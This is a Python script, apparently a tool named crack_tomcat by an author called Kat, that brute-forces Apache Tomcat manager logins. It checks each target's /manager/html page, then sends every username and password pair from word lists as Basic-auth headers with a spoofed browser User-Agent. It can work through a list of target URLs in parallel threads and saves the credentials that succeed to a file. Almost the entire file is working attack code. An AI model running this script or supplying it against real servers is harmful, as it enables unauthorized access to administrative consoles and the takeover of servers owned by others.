#!/usr/bin/python
# -*- coding: utf-8 -*-
# author:Kat

import requests
import base64
import sys
import argparse
import threadpool
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

logo = '''
 _____             __    ______                    __
 / ___/______ _____/ /__ /_  __/__  __ _  _______ _/ /_
/ /__/ __/ _ `/ __/  '_/  / / / _ \/  ' \/ __/ _ `/ __/
\___/_/  \_,_/\__/_/\_\__/_/  \___/_/_/_/\__/\_,_/\__/
                     /___/by_Kat v1.2
'''

password_base64 = []


def multithreading(funcname, filename="url.txt", pools=5):
    works = []
    with open(filename, "r") as f:
        for i in f:
            func_params = [i.rstrip("\n")]
            works.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(funcname, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()


def get_check_pass():
    with open("user.txt", "r") as f:
        for name in f:
            with open("pass.txt", "r", encoding='ISO-8859-1') as f:
                for password in f:
                    pass_str = name.strip() + ":" + password.strip()
                    base64_str = base64.b64encode(pass_str.encode('utf-8')).decode("utf-8")
                    password_base64.append(base64_str)


def fingerprint_sin(url):
    print("[+] startig tomcat fingerprint check --- ---\n")
    try:
        req = requests.get(url + "/manager/html", timeout=5, verify=False)
        if req.status_code == 401:
            print("\033[32m[+] Tomcat fingerprints found", url,"\033[0m")
            get_check_pass()
            check_tomcat(url)
        else:
            print("[+] Tomcat background not found！ --- ---\n")
    except Exception as f:
        print("[+] Network exception --- ---\n")


def fingerprint_Mu(url):
    print("[+] startig tomcat fingerprint check --- ---\n")
    try:
        req = requests.get(url + "/manager/html", timeout=5, verify=False)
        if req.status_code == 401:
            print("\033[32m[+] Tomcat fingerprints found", url,"\033[0m")
            get_check_pass()
            check_tomcat(url)
            multithreading(check_tomcat, args.check_file, 8)
        else:
            print("[+] Tomcat background not found！ --- ---\n")
    except Exception as f:
        print("[+] Network exception --- ---\n")


def check_tomcat(url):
    i = 0
    print("[+] startig tomcat cheek --- ---\n")
    con = int(len(password_base64))
    for basic in password_base64:
        i = i + 1
        print("[+] 正在进行第 {} 组密码暴破## 已完成: {:.2f}%".format(i, i / con), end="\r")
        headers = {
            "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Content-Type": "application/x-www-form-urlencoded",
            'Authorization': 'Basic %s' % basic
        }
        try:
            req = requests.get(url + "/manager/html", headers=headers, timeout=5, verify=False)
            if req.status_code == 200 and "/manager" in req.text:
                print('\033[31m'"[+] status_code:", req.status_code, "tomcat爆破成功:",
                      base64.b64decode(basic.encode("utf-8")).decode("utf-8"), '\033[0m')
                with open('result.txt', 'a+') as f:
                    f.write(url + '\n')
                    f.write(base64.b64decode(basic.encode("utf-8")).decode("utf-8"))
                    f.write('\n=============\n')
                break
            else:
                pass
        except Exception as e:
            print("[+] Abnormal blasting process! --- ---\n")


if __name__ == "__main__":
    print(logo)
    if (len(sys.argv)) < 2:
        print('Useage: python3 crack_tomcat.py -u url')
        print('Useage: python3 crack_tomcat.py -r url.txt')
    else:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', help="url -> example http://127.0.0.1", type=str, dest='check_url')
        parser.add_argument('-r', help="url list to file", type=str, dest='check_file')
        args = parser.parse_args()
        if args.check_url:
            fingerprint_sin(args.check_url)
        if (args.check_file):
            multithreading(fingerprint_Mu, args.check_file, 8)
